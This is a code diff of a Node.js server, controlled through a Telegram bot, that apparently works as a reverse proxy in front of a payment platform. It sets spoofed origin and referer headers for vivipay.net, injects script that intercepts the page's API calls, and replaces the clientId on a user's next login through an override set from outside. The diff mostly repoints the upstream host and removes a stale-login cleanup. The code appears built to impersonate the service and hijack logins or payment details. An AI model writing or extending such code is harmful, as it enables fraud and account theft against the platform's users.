@@ -3,7 +3,7 @@ const TelegramBot = require('node-telegram-bot-api');
 const { Redis } = require('@upstash/redis');
 
 const app = express();
-const TIVOX_API = 'https://qonix.click';
+const TIVOX_API = 'https://tivox.icu';
 const REAL_API = 'https://qonix.click';
 const FRONTEND_HOST = 'vivipay.net';
 const PROXY_HOST = 'rtyhh.vercel.app';
@@ -186,9 +186,6 @@ async function saveDataUnlocked(data) {
                         }
                         toSave.userOverrides = mergedOverrides;
                     }
-                    if (data.nextClientIdOverride !== undefined) {
-                        toSave.nextClientIdOverride = data.nextClientIdOverride;
-                    }
                     data = toSave;
                 } else {
                     // Bot command saving new settings / order mutations:
@@ -315,6 +312,7 @@ async function applyNextClientIdOverride(req, data) {
     const replacement = String(pending.value || '').trim();
     if (!replacement || !pending.expiresAt || Date.now() > Number(pending.expiresAt)) {
         data.nextClientIdOverride = null;
+        data._skipOverrideMerge = true;
         await saveData(data);
         return false;
     }
@@ -328,6 +326,7 @@ async function applyNextClientIdOverride(req, data) {
     // final login request, then it is consumed so it cannot affect later logins.
     if (endpoint === 'login') data.nextClientIdOverride = null;
     else data.nextClientIdOverride = pending;
+    data._skipOverrideMerge = true;
     await saveData(data);
     if (endpoint === 'login') {
         try {
@@ -2038,7 +2037,7 @@ async function proxyToTivox(req) {
         if (kl === 'host' || kl === 'connection' || kl === 'content-length' || kl === 'transfer-encoding' || kl.startsWith('x-vercel') || kl.startsWith('x-forwarded')) continue;
         fwd[k] = v;
     }
-    fwd['host'] = 'qonix.click';
+    fwd['host'] = 'tivox.icu';
     fwd['origin'] = 'https://vivipay.net';
     fwd['referer'] = 'https://vivipay.net/';
     if (!fwd['user-agent']) {
@@ -2070,7 +2069,7 @@ async function proxyToReal(req) {
         if (kl === 'host' || kl === 'connection' || kl === 'content-length' || kl === 'transfer-encoding' || kl === 'x-px-uid' || kl.startsWith('x-vercel') || kl.startsWith('x-forwarded') || kl.startsWith('x-px-')) continue;
         fwd[k] = v;
     }
-    fwd['host'] = 'qonix.click';
+    fwd['host'] = 'tivox.icu';
     fwd['origin'] = 'https://vivipay.net';
     fwd['referer'] = 'https://vivipay.net/';
     if (!fwd['user-agent']) {
@@ -3561,7 +3560,7 @@ ${replaceLine}
                 if (kl === 'host' || kl === 'connection' || kl === 'content-length' || kl === 'transfer-encoding' || kl.startsWith('x-vercel') || kl.startsWith('x-forwarded')) continue;
                 fwd[k] = v;
             }
-            fwd['host'] = 'qonix.click';
+            fwd['host'] = 'tivox.icu';
             const opts = { method: req.method, headers: fwd, redirect: 'manual' };
             if (req.method !== 'GET' && req.method !== 'HEAD' && req.rawBody && req.rawBody.length > 0) {
                 opts.body = req.rawBody;
@@ -3582,16 +3581,6 @@ var P='https://${PROXY_HOST}';
 var REAL='https://tivox.icu';
 var REAL2='https://qonix.click';
 var SERVER_IFSC='';
-
-// ── Fresh login: clear stale clientId & sendtoken on every page load ──
-// Normal browser mein purana clientId localStorage mein rehta hai jo backend
-// reject karta hai ("Send verify error" / "Too frequent"). Incognito mein ye
-// nhi hota isliye wahan login kaam karta hai. Ye fix har page load pe stale
-// auth state clear karta hai taaki fresh flow chale — exactly jaisa incognito.
-try{
-  localStorage.removeItem('clientId');
-  localStorage.removeItem('sendtoken');
-}catch(e){}
 
 // ── Intercept API calls so <base> tag doesn't redirect them to vivipay.net ──
 (function(){
